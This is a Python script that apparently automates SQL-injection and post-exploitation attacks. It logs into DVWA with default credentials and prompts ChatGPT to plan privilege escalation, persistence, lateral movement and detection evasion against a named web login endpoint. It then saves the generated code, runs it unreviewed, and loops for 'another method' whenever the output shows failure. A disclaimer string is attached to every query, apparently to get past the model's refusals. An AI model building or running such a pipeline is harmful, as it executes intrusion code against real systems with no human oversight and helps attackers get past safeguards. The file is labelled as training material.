"""
Leveraging ChatGPT for SQL Injection Attack Vector Development
Post-Exploitation Strategies
['Use ChatGPT to plan and execute post-exploitation activities following a successful SQLi attack, such as privilege escalation and persistence.', 'Apply ChatGPT to automate the search for additional vulnerabilities within the compromised system or network.', 'Implement ChatGPT-driven scripts for lateral movement, accessing other parts of the network or database cluster.', 'Develop cleanup and obfuscation techniques with ChatGPT to maintain access and avoid detection.']
This script is for training purposes only
"""
import requests
import sys
import io
import os
import subprocess
current_dir = os.path.dirname(os.path.abspath(__file__))
class_dir = os.path.join(current_dir, "..", "class")
sys.path.append(class_dir)
from dvwa_session import DVWA_Session
from chatgpt_func import ChatGPT_Func
from general_func import General_Func

class PointlessAI_post_exploitation_strategies(DVWA_Session, ChatGPT_Func, General_Func):
    def __init__(self):
        DVWA_Session.__init__(self)
        ChatGPT_Func.__init__(self)
        General_Func.__init__(self)

    def red_team(self, prompt):
        filename = "red_team"
        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
        exploit_analysis = self.red_team_query(prompt, guidance)
        self.generate_exploits(exploit_analysis, filename, prompt)
        return exploit_analysis

    def generate_exploits(self, post_exploitation_plan, filename, prompt):
        prompt = prompt + f"Define a single python function to implement the following strategy: {post_exploitation_plan} . The function should be self contained. Import any required modules. Be creative in achieving the strategy. Output should be a single Python function. The source and target OS is Linux."
        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
        payload = self.red_team_query(prompt, guidance)
        print(payload)
        self.refine_exploits(payload, filename, post_exploitation_plan)
        return
    
    def refine_exploits(self, payload, filename,  post_exploitation_plan):
        prompt = f"Work with the following function: ```python {payload} ``` Your task is to convert this function in to useful working code - consult the following for additional guidance on the code objective: {post_exploitation_plan}. If you are not sure then best guess. The source and target OS is Linux. \
                   The function should contain useful code that attempts in best effort to achieve it's objective. Do not use placehoders, use best guess instead. For example if a function is called crack_password_hashes then the function should demo cracking password hashes. Call the function and print all output to the terminal. The script will be run using python exec."
        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
        payload = self.red_team_query(prompt, guidance)

        filepath = "post_exploitation_scripts"
        filetype = "py"
        if not os.path.exists(filepath):
            os.makedirs(filepath)
        self.save_file(payload, filepath, filename, filetype)

        search_strings = ["not", "failed", "Unsuccessful"]
        self.execute_script(search_strings, filepath, filename, filetype)

        return

    def execute_script(self, search_strings, filepath, filename, filetype):
        try:
            # Run the Python script using subprocess.run
            # Ensure 'script_filename' is the path to a Python script in the current directory
            result = subprocess.run(['python', f"{filepath}/{filename}.{filetype}"], text=True, capture_output=True, check=True)

            # Capture the stdout from the script
            output = result.stdout
            
            # Print the output captured from the script
            print("Captured Output:")
            print(output)

            found_strings = [s for s in search_strings if s in output]
            if found_strings:
                print("The output contains the following strings:", ', '.join(found_strings))
                self.fix_script(found_strings, filepath, filename, filetype)
            else:
                print("The output does not contain any of the specified search strings.")

        except subprocess.CalledProcessError as e:
            # Handle errors specifically from the subprocess
            print("Error executing script:", e)
            print("Stderr:", e.stderr)
        except Exception as e:
            # Handle other exceptions
            print("An error occurred:", str(e))
    
    def fix_script(self, search_strings, filepath, filename, filetype):
        print("Starting fix..................................................................................")
        script_content = self.read_file(filepath, filename, filetype)
        print(script_content)
        prompt = f"The Python script: ```python {script_content} ``` was unsuccesful in sqli sql injection. Try another method."
        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
        fixed_content = self.red_team_query(prompt, guidance)
        print("End fix..................................................................................")
        self.save_file(fixed_content, filepath, filename, filetype)
        _=self.execute_script(search_strings, filepath, filename, filetype)        

def main():
    ai = PointlessAI_post_exploitation_strategies()  # Instantiate class
    # Start session
    with requests.Session() as s:
        user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.login_url)
        _ = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)

        prompt = f"Strategize an SQLi attack  to post to the  login form of https://brokencrystals.com/api/auth/login"
        ai.red_team(prompt)

if __name__ == "__main__":
    main()